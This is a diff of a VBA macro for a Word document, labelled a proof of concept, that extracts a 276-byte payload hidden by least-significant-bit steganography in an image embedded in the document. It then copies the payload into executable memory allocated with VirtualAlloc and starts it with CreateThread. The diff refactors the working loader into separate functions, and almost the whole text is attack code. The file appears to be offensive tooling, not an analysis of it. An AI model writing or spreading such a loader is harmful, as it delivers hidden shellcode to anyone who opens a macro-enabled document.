@@ -1,12 +1,14 @@
 'I am slowly loosing my mental health here
 
 Private Declare PtrSafe Function IsClipboardFormatAvailable Lib "user32" (ByVal wFormat As Integer) As Long
+
 Private Declare PtrSafe Function OpenClipboard Lib "user32" (ByVal hwnd As LongPtr) As Long
 Private Declare PtrSafe Function CloseClipboard Lib "user32" () As Long
+
 Private Declare PtrSafe Function GetClipboardData Lib "user32" (ByVal wFormat As Long) As LongPtr
-Private Declare PtrSafe Function GetObjectA Lib "gdi32" (ByVal hObject As LongPtr, ByVal nCount As Long, lpObject As BITMAP64) As Long
 
 Private Declare PtrSafe Function CopyImage Lib "user32" (ByVal handle As LongPtr, ByVal un1 As Long, ByVal n1 As Long, ByVal n2 As Long, ByVal un2 As Long) As LongPtr
+Private Declare PtrSafe Function GetObject Lib "gdi32" Alias "GetObjectW" (ByVal hObject As LongPtr, ByVal nCount As Long, lpObject As BITMAP) As Long
 
 Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As LongPtr)
 Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
@@ -32,37 +34,22 @@ Const MEM_RESERVE = &H2000
 Const MEM_COMMIT = &H1000
 Const PAGE_EXECUTE_READWRITE = &H40
 
-Sub poc()
-ActiveDocument.InlineShapes(1).Range.CopyAsPicture
+Private Function GetLsb(ByVal Target As Byte, ByVal Source As Byte) As Byte
+    GetLsb = (Target * 2) Or (Source And 1)
+End Function
 
-Dim lAvailable As Long, lResult As Long
-lAvailable = IsClipboardFormatAvailable(CF_BITMAP)
 
-If lAvailable <> 0 Then
-   Dim hKeyboard As Long, hPtr As LongPtr, hBitmap As LongPtr, Bmp As BITMAP64
-   
-   hKeyboard = OpenClipboard(0&)
-   hPtr = GetClipboardData(CF_BITMAP)
-   hBitmap = CopyImage(hPtr, IMAGE_BITMAP, 0, 0, LR_COPYRETURNORG Or LR_CREATEDIBSECTION)
-   hKeyboard = CloseClipboard
-   
-   
-   Dim lBmBitsSize As Long
-   lResult = GetObject(hBitmap, Len(Bmp), Bmp)
-
+Private Function Read(Bmp As BITMAP, lPayloadSize As Long) As Byte()
    Dim lRowLength As Long, bBmBitsArr() As Byte
-   
    'Bitmap contained in clipboard is actually 32bit RGBA
    'No padding required at the end of the row
-   
    lRowLength = Bmp.bmWidth * 4
    lBmBitsSize = (lRowLength) * (Bmp.bmHeight)
    ReDim bBmBitsArr(lBmBitsSize)
 
    RtlMoveMemory VarPtr(bBmBitsArr(0)), Bmp.bmBits, lBmBitsSize
-
-   Dim lPayloadSize As Long, lBitLength As Long, bPayloadArr() As Byte
-   lPayloadSize = 276
+   
+   Dim lBitLength As Long, bPayloadArr() As Byte
    lBitLength = lPayloadSize * 8
    ReDim bPayloadArr(lPayloadSize)
 
@@ -86,9 +73,8 @@ If lAvailable <> 0 Then
                If lBitLength <= 0 Then
                    bPayloadArr(lBytePos) = 0
                    
-                   Run VarPtr(bPayloadArr(0)), lPayloadSize
-                   
-                   Exit Sub
+                   Read = bPayloadArr
+                   Exit Function
                End If
                
                bPayloadArr(lBytePos) = GetLsb(bPayloadArr(lBytePos), bChannelsArr(k))
@@ -98,16 +84,10 @@ If lAvailable <> 0 Then
        Next x
        lYOffset = lYOffset - lRowLength
    Next y
-End If
-End Sub
-
-
-Private Function GetLsb(ByVal Target As Byte, ByVal Source As Byte) As Byte
-  GetLsb = (Target * 2) Or (Source And 1)
 End Function
 
 
-Sub Run(ByVal lPayloadAddr As LongPtr, ByVal lPayloadSize As Long)
+Private Sub Run(ByVal lPayloadAddr As LongPtr, ByVal lPayloadSize As Long)
    Dim lpMemPtr As LongPtr, lResult As Long
    lpMemPtr = VirtualAlloc(0&, lPayloadSize, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    
@@ -116,4 +96,29 @@ Sub Run(ByVal lPayloadAddr As LongPtr, ByVal lPayloadSize As Long)
 End Sub
 
 
+Private Sub poc()
+    ActiveDocument.InlineShapes(1).Range.CopyAsPicture
 
+    Dim lAvailable As Long, lResult As Long
+    lAvailable = IsClipboardFormatAvailable(CF_BITMAP)
+
+    If lAvailable <> 0 Then
+        Dim hKeyboard As Long, hPtr As LongPtr, hBitmap As LongPtr, Bmp As BITMAP
+        
+        hKeyboard = OpenClipboard(0&)
+        hPtr = GetClipboardData(CF_BITMAP)
+        hBitmap = CopyImage(hPtr, IMAGE_BITMAP, 0, 0, LR_COPYRETURNORG Or LR_CREATEDIBSECTION)
+        hKeyboard = CloseClipboard
+        
+        Dim lBmBitsSize As Long
+        lResult = GetObject(hBitmap, Len(Bmp), Bmp)
+
+
+        Dim lPayloadSize As Long, lBitLength As Long, bPayloadArr() As Byte
+        lPayloadSize = 276
+            
+        bPayloadArr = Read(Bmp, lPayloadSize)
+
+        Run VarPtr(bPayloadArr(0)), lPayloadSize   
+    End If
+End Sub
